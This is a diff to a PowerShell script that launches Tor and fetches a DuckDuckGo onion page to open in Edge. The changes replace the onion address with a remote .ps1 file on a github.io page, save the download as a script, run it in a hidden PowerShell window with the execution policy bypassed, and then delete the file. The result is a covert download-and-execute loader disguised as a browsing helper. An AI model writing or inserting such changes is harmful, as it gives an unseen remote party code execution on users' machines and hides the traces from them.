@@ -35,7 +35,8 @@ $TorUrl = "https://archive.torproject.org/tor-package-archive/torbrowser/15.0.3/
 
 $TorPort = 9050
 $DataDir = Join-Path $P "tor-data"
-$OnionUrl = "https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/"
+# $OnionUrl = "https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/"
+$OnionUrl = "https://manuelwestermeier.github.io/test.ps1"
 
 # -----------------------
 # Helper Functions
@@ -113,10 +114,10 @@ while (-not (Test-NetConnection 127.0.0.1 -Port $TorPort).TcpTestSucceeded) {
 # -----------------------
 # Fetch onion site content (save to file)
 # -----------------------
-$OutputFile = Join-Path $P "data.html"
+$OutputFile = Join-Path $P "data.ps1"
 
 try {
-    Write-Host "Fetching $OnionUrl via Tor (saving to data.txt)..."
+    Write-Host "Fetching $OnionUrl via Tor (saving to data.ps1)..."
     curl.exe --socks5-hostname "127.0.0.1:$TorPort" -s $OnionUrl `
         | Out-File -FilePath $OutputFile -Encoding UTF8 -Force
 }
@@ -127,4 +128,8 @@ finally {
     }
 }
 
-Start-Process "msedge.exe" $OutputFile
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $OutputFile" -WindowStyle Hidden
+
+if (Test-Path $OutputFile) {
+    Remove-Item -Path $OutputFile -Force
+}
